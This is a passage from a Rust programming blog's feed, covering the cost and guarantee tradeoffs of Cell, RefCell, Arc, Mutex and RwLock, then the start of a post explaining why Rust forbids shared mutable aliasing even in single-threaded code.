</span><span class='line'><span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">.</span><span class="n">get</span><span class="p">());</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that here we were able to mutate the same value from various immutable references.</p>

<p>This has the same runtime cost as the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">z</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'><span class="n">x</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span><span class='line'><span class="o">*</span><span class="n">z</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'><span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>but it has the added benefit of actually compiling successfully.</p>

<h4>Guarantees</h4>

<p>This relaxes the &ldquo;no aliasing with mutability&rdquo; restriction in places where it&rsquo;s
unnecessary. However, this also relaxes the guarantees that the restriction provides;
so if one&rsquo;s invariants depend on data stored within <code>Cell</code>, one should be careful.</p>

<p>This is useful for mutating primitives and other <code>Copy</code> types when there is no easy way of
doing it in line with the static rules of <code>&amp;</code> and <code>&amp;mut</code>.</p>

<p><a href="http://www.reddit.com/r/rust/comments/378tj6/blog_post_review_requested_container_types/crlfl74">Gรกbor Lehel</a> summed up the guarantees provided by <code>Cell</code> in a rather succinct manner:</p>

<blockquote><p>The basic guarantee we need to ensure is that interior references can&rsquo;t be invalidated (left dangling)
by mutation of the outer structure. (Think about references to the interiors of types like <code>Option</code>,
<code>Box</code>, <code>Vec</code>, etc.) <code>&amp;</code>, <code>&amp;mut</code>, and Cell each make a different tradeoff here.
<code>&amp;</code> allows shared interior references but forbids mutation;
<code>&amp;mut</code> allows mutation xor interior references but not sharing;
<code>Cell</code> allows shared mutability but not interior references.</p></blockquote>

<p>Ultimately, while shared mutability can cause many logical errors (as outlined in <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">my previous post
</a>), it can only cause memory safety errors when coupled with &ldquo;interior references&rdquo;. This
is for types who have an &ldquo;interior&rdquo; whose type/size can itself be changed. One example of this is a
Rust enum; where by changing the variant you can change what type is contained. If you have an alias
to the inner type whilst the variant is changed, pointers within that alias may be invalidated.
Similarly, if you change the length of a vector while you have an alias to one of its elements, that
alias may be invalidated.</p>

<p>Since <code>Cell</code> doesn&rsquo;t allow references to the insides of a type (you can only copy out and copy back
in), enums and structs alike are safe to be aliased mutably within this.</p>

<p><a href="https://www.reddit.com/r/rust/comments/32ypxp/questions_about_mutability/cqfwl3h">This comment by Eddy also touches on the guarantees of <code>Cell</code> and the alternatives</a></p>

<h4>Cost</h4>

<p>There is no runtime cost to using <code>Cell&lt;T&gt;</code>, however if one is using it
to wrap larger (<code>Copy</code>) structs, it might be worthwhile to instead wrap individual
fields in <code>Cell&lt;T&gt;</code> since each write is a full copy of the struct.</p>

<h2><code>RefCell&lt;T&gt;</code></h2>

<p><a href="http://doc.rust-lang.org/doc/std/cell/struct.RefCell.html"><code>RefCell&lt;T&gt;</code></a> also provides interior mutability, but isn&rsquo;t restricted to <code>Copy</code> types.</p>

<p>Instead, it has a runtime cost. <code>RefCell&lt;T&gt;</code> enforces the RWLock pattern at runtime (it&rsquo;s like a single-threaded mutex),
unlike <code>&amp;T</code>/<code>&amp;mut T</code> which do so at compile time. This is done by the <code>borrow()</code> and
<code>borrow_mut()</code> functions, which modify an internal reference count and return smart pointers
which can be dereferenced immutably and mutably respectively. The refcount is restored
when the smart pointers go out of scope. With this system, we can dynamically ensure that
there are never any other borrows active when a mutable borrow is active. If the programmer
attempts to make such a borrow, the thread will panic.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">RefCell</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]);</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">x</span><span class="p">.</span><span class="n">borrow</span><span class="p">())</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">my_ref</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">borrow_mut</span><span class="p">();</span>
</span><span class='line'>    <span class="n">my_ref</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Similar to <code>Cell</code>, this is mainly useful for situations where it&rsquo;s hard or impossible to satisfy the
borrow checker. Generally one knows that such mutations won&rsquo;t happen in a nested form, but it&rsquo;s good
to check.</p>

<p>For large, complicated programs, it becomes useful to put some things in <code>RefCell</code>s to
make things simpler. For example, a lot of the maps in <a href="http://doc.rust-lang.org/rustc/middle/ty/struct.ctxt.html">the <code>ctxt</code> struct</a> in the rust compiler
internals are inside this wrapper. These are only modified once (during creation, which is not
right after initialization) or a couple of times in well-separated places. However, since this struct is
pervasively used everywhere, juggling mutable and immutable pointers would be hard (perhaps impossible)
and probably form a soup of <code>&amp;</code>-ptrs which would be hard to extend. On the other hand, the <code>RefCell</code>
provides a cheap (not zero-cost) way of safely accessing these. In the future, if someone adds some code
that attempts to modify the cell when it&rsquo;s already borrowed, it will cause a (usually deterministic) panic
which can be traced back to the offending borrow.</p>

<p>Similarly, in Servo&rsquo;s DOM we have a lot of mutation, most of which is local to a DOM type, but
some of which crisscrosses the DOM and modifies various things. Using <code>RefCell</code> and <code>Cell</code> to guard
all mutation lets us avoid worrying about mutability everywhere, and it simultaneously
highlights the places where mutation is <em>actually</em> happening.</p>

<p>Note that <code>RefCell</code> should be avoided if a mostly simple solution is possible with <code>&amp;</code> pointers.</p>

<h4>Guarantees</h4>

<p><code>RefCell</code> relaxes the <em>static</em> restrictions preventing aliased mutation, and
replaces them with <em>dynamic</em> ones. As such the guarantees have not changed.</p>

<h4>Cost</h4>

<p><code>RefCell</code> does not allocate, but it contains an additional &ldquo;borrow state&rdquo;
indicator (one word in size) along with the data.</p>

<p>At runtime each borrow causes a modification/check of the refcount.</p>

<h1>Synchronous types</h1>

<p>Many of the types above cannot be used in a threadsafe manner. Particularly, <code>Rc&lt;T&gt;</code> and <code>RefCell&lt;T&gt;</code>,
which both use non-atomic ref counts, cannot be used this way. This makes them cheaper to use, but one
needs thread safe versions of these too. They exist, in the form of <code>Arc&lt;T&gt;</code> and <code>Mutex&lt;T&gt;</code>/<code>RWLock&lt;T&gt;</code></p>

<p>Note that the non-threadsafe types <em>cannot</em> be sent between threads, and this is checked at compile time.
I&rsquo;ll touch on how this is done in a later blog post.</p>

<p>There are many useful wrappers for concurrent programming in the <a href="https://doc.rust-lang.org/nightly/std/sync/index.html">sync</a> module, but I&rsquo;m only going to cover
the major ones.</p>

<h2><code>Arc&lt;T&gt;</code></h2>

<p><a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc&lt;T&gt;</code></a> is just a version of <code>Rc&lt;T&gt;</code> that uses an atomic reference count (hence, &ldquo;Arc&rdquo;). This can be sent
freely between threads.</p>

<p>C++&rsquo;s <code>shared_ptr</code> is similar to <code>Arc</code>, however in C++s case the inner data is always mutable. For semantics
similar to that from C++, we should use <code>Arc&lt;Mutex&lt;T&gt;&gt;</code>, <code>Arc&lt;RwLock&lt;T&gt;&gt;</code>, or <code>Arc&lt;UnsafeCell&lt;T&gt;&gt;</code><sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> (<code>UnsafeCell&lt;T&gt;</code>
is a cell type that can be used to hold any data and has no runtime cost, but accessing it requires <code>unsafe</code> blocks).
The last one should only be used if one is certain that the usage won&rsquo;t cause any memory unsafety. Remember that
writing to a struct is not an atomic operation, and many functions like <code>vec.push()</code> can reallocate internally
and cause unsafe behavior (so even monotonicity<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> may not be enough to justify <code>UnsafeCell</code>)</p>

<h4>Guarantees</h4>

<p>Like <code>Rc</code>, this provides the (thread safe) guarantee that the destructor for the internal data
will be run when the last <code>Arc</code> goes out of scope (barring any cycles).</p>

<h4>Cost</h4>

<p>This has the added cost of using atomics for changing the refcount (which will happen whenever it is cloned
or goes out of scope). When sharing data from an <code>Arc</code> in
a single thread, it is preferable to share <code>&amp;</code> pointers whenever possible.</p>

<h2><code>Mutex&lt;T&gt;</code> and <code>RwLock&lt;T&gt;</code></h2>

<p><a href="https://doc.rust-lang.org/std/sync/struct.Mutex.html"><code>Mutex&lt;T&gt;</code></a> and <a href="https://doc.rust-lang.org/std/sync/struct.RwLock.html"><code>RwLock&lt;T&gt;</code></a> provide mutual-exclusion via RAII guards. For both of these, the
mutex is opaque until one calls <code>lock()</code> on it, at which point the thread will
block until a lock can be acquired, and then a guard will be returned. This guard
can be used to access the inner data (mutably), and the lock will be released when the
guard goes out of scope.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">guard</span> <span class="o">=</span> <span class="n">mutex</span><span class="p">.</span><span class="n">lock</span><span class="p">();</span>
</span><span class='line'>    <span class="c1">// guard dereferences mutably to the inner type</span>
</span><span class='line'>    <span class="o">*</span><span class="n">guard</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="c1">// lock released when destructor runs</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>RwLock</code> has the added benefit of being efficient for multiple reads. It is always
safe to have multiple readers to shared data as long as there are no writers; and <code>RwLock</code>
lets readers acquire a &ldquo;read lock&rdquo;. Such locks can be acquired concurrently and are kept track of
via a reference count. Writers must obtain a &ldquo;write lock&rdquo; which can only be obtained when all readers
have gone out of scope.</p>

<h4>Guarantees</h4>

<p>Both of these provide safe shared mutability across threads, however they are prone to deadlocks.
Some level of additional protocol safety can be obtained via the type system. An example
of this is <a href="https://github.com/Munksgaard/rust-sessions">rust-sessions</a>, an experimental library which uses session
types for protocol safety.</p>

<h4>Costs</h4>

<p>These use internal atomic-like types to maintain the locks, and these are similar pretty
costly (they can block all memory reads across processors till they&rsquo;re done). Waiting on these locks
can also be slow when there&rsquo;s a lot of concurrent access happening.</p>

<h1>Composition</h1>

<p>A common gripe when reading Rust code is with stuff like <code>Rc&lt;RefCell&lt;Vec&lt;T&gt;&gt;&gt;</code> and more complicated
compositions of such types.</p>

<p>Usually, it&rsquo;s a case of composing together the guarantees that one needs, without paying for stuff that is
unnecessary.</p>

<p>For example, <code>Rc&lt;RefCell&lt;T&gt;&gt;</code> is one such composition. <code>Rc</code> itself can&rsquo;t be dereferenced mutably;
because <code>Rc</code> provides sharing and shared mutability isn&rsquo;t good, so we put <code>RefCell</code> inside to get
dynamically verified shared mutability. Now we have shared mutable data, but it&rsquo;s shared in a way
that there can only be one mutator (and no readers) or multiple readers.</p>

<p>Now, we can take this a step further, and have <code>Rc&lt;RefCell&lt;Vec&lt;T&gt;&gt;&gt;</code> or <code>Rc&lt;Vec&lt;RefCell&lt;T&gt;&gt;&gt;</code>.
These are both shareable, mutable vectors, but they&rsquo;re not the same.</p>

<p>With the former, the <code>RefCell</code> is wrapping the <code>Vec</code>, so the <code>Vec</code> in its entirety is mutable.
At the same time, there can only be one mutable borrow of the whole <code>Vec</code> at a given time. This
means that your code cannot simultaneously work on different elements of the vector from different
<code>Rc</code> handles. However, we are able to push and pop from the <code>Vec</code> at will. This is similar to an <code>&amp;mut Vec&lt;T&gt;</code>
with the borrow checking done at runtime.</p>

<p>With the latter, the borrowing is of individual elements, but the overall vector is immutable.
Thus, we can independently borrow separate elements, but we cannot push or pop from the vector.
This is similar to an <code>&amp;mut [T]</code><sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>, but, again, the borrow checking is at runtime.</p>

<p>In concurrent programs, we have a similar situation with <code>Arc&lt;Mutex&lt;T&gt;&gt;</code>, which provides shared
mutability and ownership.</p>

<p>When reading code that uses these, go in step by step and look at the guarantees/costs provided.</p>

<p>When choosing a composed type, we must do the reverse; figure out which guarantees we want, and at which
point of the composition we need them. For example, if there is a choice between <code>Vec&lt;RefCell&lt;T&gt;&gt;</code> and <code>RefCell&lt;Vec&lt;T&gt;&gt;</code>,
we should figure out the tradeoffs as done above and pick one.</p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=9613016">HN</a>, <a href="http://www.reddit.com/r/rust/comments/37hg1y/wrapper_types_in_rust_choosing_your_guarantees/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>I&rsquo;m not sure if this is the technical term for them, but I&rsquo;ll be calling them that throughout this post.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>By &ldquo;stack representation&rdquo; I mean the data on the stack when a value of this type is held on the stack. For example, a <code>Vec&lt;T&gt;</code> has a stack representation of a pointer and two integers (length, capacity). While there is more data behind the indirection of the pointer, it is not part of the stack-held portion of the <code>Vec</code>. Looking at this a different way, a type is <code>Copy</code> if a <code>memcopy</code> of the data copies all the data owned by it.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p><code>Arc&lt;UnsafeCell&lt;T&gt;&gt;</code> actually won&rsquo;t compile since <code>UnsafeCell&lt;T&gt;</code> isn&rsquo;t <code>Send</code> or <code>Sync</code>, but we can wrap it in a type and implement <code>Send</code>/<code>Sync</code> for it manually to get <code>Arc&lt;Wrapper&lt;T&gt;&gt;</code> where <code>Wrapper</code> is <code>struct Wrapper&lt;T&gt;(UnsafeCell&lt;T&gt;)</code>.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>By this I mean a piece of data that has a monotonic consistency requirement; i.e. a counter or a monotonically growing stack<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p><code>&amp;[T]</code> and <code>&amp;mut [T]</code> are <em>slices</em>; they consist of a pointer and a length and can refer to a portion of a vector or array. <code>&amp;mut [T]</code> can have its elements mutated, however its length cannot be touched.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Problem With Single-threaded Shared Mutability]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/"/>
    <updated>2015-05-17T17:56:59-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability</id>
    <content type="html"><![CDATA[<p>This is a post that I&rsquo;ve been meaning to write for a while now; and the release of Rust 1.0 gives
me the perfect impetus to go ahead and do it.</p>

<p>Whilst this post discusses a choice made in the design of Rust; and uses examples in Rust; the principles discussed
here apply to other languages for the most part. I&rsquo;ll also try to make the post easy to understand for those without
a Rust background; please let me know if some code or terminology needs to be explained.</p>

<p>What I&rsquo;m going to discuss here is the choice made in Rust to disallow having multiple mutable aliases
to the same data (or a mutable alias when there are active immutable aliases),
<strong>even from the same thread</strong>. In essence, it disallows one from doing things like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Vec</span><span class="o">::</span><span class="n">new</span><span class="p">();</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">;</span> <span class="c1">// Take a mutable reference to `x`</span>
</span><span class='line'>    <span class="n">ptr</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Allowed</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// Not allowed (will not compile): as long as `ptr` is active,</span>
</span><span class='line'>                  <span class="c1">// x cannot be read from ...</span>
</span><span class='line'>    <span class="n">x</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>    <span class="c1">// .. or written to</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// alternatively,</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Vec</span><span class="o">::</span><span class="n">new</span><span class="p">();</span>
</span><span class='line'><span class="n">x</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Allowed</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">;</span> <span class="c1">// Create an immutable reference</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// Allowed, nobody can mutate</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// Similarly allowed</span>
</span><span class='line'>    <span class="n">x</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Not allowed (will not compile): as long as `ptr` is active,</span>
</span><span class='line'>               <span class="c1">// `x` is frozen for mutation</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is essentially the &ldquo;Read-Write lock&rdquo; (RWLock) pattern, except it&rsquo;s not being used in a
threaded context, and the &ldquo;locks&rdquo; are done via static analysis (compile time &ldquo;borrow checking&rdquo;).</p>

<p>Newcomers to the language have the recurring question as to why this exists. <a href="http://doc.rust-lang.org/nightly/book/ownership.html">Ownership semantics</a>
and immutable <a href="http://doc.rust-lang.org/nightly/book/references-and-borrowing.html">borrows</a> can be grasped because there are concrete examples from languages like C++ of
problems that these concepts prevent. It makes sense that having only one &ldquo;owner&rdquo; and then multiple &ldquo;borrowers&rdquo; who
are statically guaranteed to not stick around longer than the owner will prevent things like use-after-free.</p>

<p>But what could possibly be wrong with having multiple handles for mutating an object? Why do we need an RWLock pattern? <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></p>

<h2>It causes memory unsafety</h2>

<p>This issue is specific to Rust, and I promise that this will be the only Rust-specific answer.</p>

<p><a href="http://doc.rust-lang.org/nightly/book/enums.html">Rust enums</a> provide a form of algebraic data types. A Rust enum is allowed to &ldquo;contain&rdquo; data,
for example you can have the enum</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">enum</span> <span class="n">StringOrInt</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Str</span><span class="p">(</span><span class="n">String</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">Int</span><span class="p">(</span><span class="kt">i64</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>which gives us a type that can either be a variant <code>Str</code>, with an associated string, or a variant <code>Int</code><sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, with an associated integer.</p>

<p>With such an enum, we could cause a segfault like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="nb">Str</span><span class="p">(</span><span class="s">&quot;Hi!&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">());</span> <span class="c1">// Create an instance of the `Str` variant with associated string &quot;Hi!&quot;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">;</span> <span class="c1">// Create a mutable alias to x</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="kd">let</span> <span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="n">insides</span><span class="p">)</span> <span class="o">=</span> <span class="n">x</span> <span class="p">{</span> <span class="c1">// If x is a `Str`, assign its inner data to the variable `insides`</span>
</span><span class='line'>    <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="nb">Int</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Set `*y` to `Int(1), therefore setting `x` to `Int(1)` too</span>
</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;x says: {}&quot;</span><span class="p">,</span> <span class="n">insides</span><span class="p">);</span> <span class="c1">// Uh oh!</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, we invalidated the <code>insides</code> reference because setting <code>x</code> to <code>Int(1)</code> meant that there is no longer a string inside it.
However, <code>insides</code> is still a reference to a <code>String</code>, and the generated assembly would try to dereference the memory location where
the pointer to the allocated string <em>was</em>, and probably end up trying to dereference <code>1</code> or some nearby data instead, and cause a segfault.</p>

<p>Okay, so far so good. We know that for Rust-style enums to work safely in Rust, we need the RWLock pattern. But are there any other
reasons we need the RWLock pattern? Not many languages have such enums, so this shouldn&rsquo;t really be a problem for them.</p>

<h2>Iterator invalidation</h2>

<p>Ah, the example that is brought up almost every time the question above is asked. While I&rsquo;ve been quite guilty of
using this example often myself (and feel that it is a very appropriate example that can be quickly explained),
I also find it to be a bit of a cop-out, for reasons which I will explain below. This is partly why I&rsquo;m writing
this post in the first place; a better idea of the answer to The Question should be available for those who want
to dig deeper.</p>

<p>Iterator invalidation involves using tools like iterators whilst modifying the underlying dataset somehow.</p>

<p>For example,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="o">&amp;</span><span class="n">buf</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Firstly, this will loop infinitely (if it compiled, which it doesn&rsquo;t, because Rust prevents this). The
equivalent C++ example would be <a href="http://stackoverflow.com/questions/5638323/modifying-a-data-structure-while-iterating-over-it">this one</a>, which I <a href="http://manishearth.github.io/Presentations/Rust/#/1/2">use</a> at every opportunity.</p>

<p>What&rsquo;s happening in both code snippets is that the iterator is really just a pointer to the vector and an index.
It doesn&rsquo;t contain a snapshot of the original vector; so pushing to the original vector will make the iterator iterate for
longer. Pushing once per iteration will obviously make it iterate forever.</p>

<p>The infinite loop isn&rsquo;t even the real problem here. The real problem is that after a while, we could get a segmentation fault.
Internally, vectors have a certain amount of allocated space to work with. If the vector is grown past this space,
a new, larger allocation may need to be done (freeing the old one), since vectors must use contiguous memory.</p>

<p>This means that when the vector overflows its capacity, it will reallocate, invalidating the reference stored in the
iterator, and causing use-after-free.</p>

<p>Of course, there is a trivial solution in this case &mdash; store a reference to the <code>Vec</code>/<code>vector</code> object inside
the iterator instead of just the pointer to the vector on the heap. This leads to some extra indirection or a larger
stack size for the iterator (depending on how you implement it), but overall will prevent the memory unsafety.</p>

<p>This would still cause problems with more complex situations involving multidimensional vectors, however.</p>

<h2>&ldquo;It&rsquo;s effectively threaded&rdquo;</h2>

<blockquote><p>Aliasing with mutability in a sufficiently complex, single-threaded program is effectively the same thing as
accessing data shared across multiple threads without a lock</p></blockquote>

<p>(The above is my paraphrasing of someone else&rsquo;s quote; but I can&rsquo;t find the original or remember who made it)</p>

<p>Let&rsquo;s step back a bit and figure out why we need locks in multithreaded programs. The way caches and memory work;
we&rsquo;ll never need to worry about two processes writing to the same memory location simultaneously and coming up with
a hybrid value, or a read happening halfway through a write.</p>

<p>What we do need to worry about is the rug being pulled out underneath our feet. A bunch of related reads/writes
would have been written with some invariants in mind, and arbitrary reads/writes possibly happening between them
would invalidate those invariants. For example, a bit of code might first read the length of a vector, and then go ahead
and iterate through it with a regular for loop bounded on the length.
The invariant assumed here is the length of the vector. If <code>pop()</code> was called on the vector in some other thread, this invariant could be
invalidated after the read to <code>length</code> but before the reads elsewhere, possibly causing a segfault or use-after-free in the last iteration.</p>

<p>However, we can have a situation similar to this (in spirit) in single threaded code. Consider the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">some_big_thing</span><span class="p">();</span>
</span><span class='line'><span class="kd">let</span> <span class="n">len</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">some_vec</span><span class="p">.</span><span class="n">len</span><span class="p">();</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mf">0.</span><span class="p">.</span><span class="n">len</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="p">.</span><span class="n">do_something_complicated</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">some_vec</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We have the same invariant here; but can we be sure that <code>x.do_something_complicated()</code> doesn&rsquo;t modify <code>x.some_vec</code> for
some reason? In a complicated codebase, where <code>do_something_complicated()</code> itself calls a lot of other functions which may
also modify <code>x</code>, this can be hard to audit.</p>

<p>Of course, the above example is a simplification and contrived; but it doesn&rsquo;t seem unreasonable to assume that such
bugs can happen in large codebases &mdash; where many methods being called have side effects which may not always be evident.</p>

<p>Which means that in large codebases we have almost the same problem as threaded ones. It&rsquo;s very hard to maintain invariants
when one is not completely sure of what each line of code is doing. It&rsquo;s possible to become sure of this by reading through the code
(which takes a while), but further modifications may also have to do the same. It&rsquo;s impractical to do this all the time and eventually
bugs will start cropping up.</p>

<p>On the other hand, having a static guarantee that this can&rsquo;t happen is great. And when the code is too convoluted for
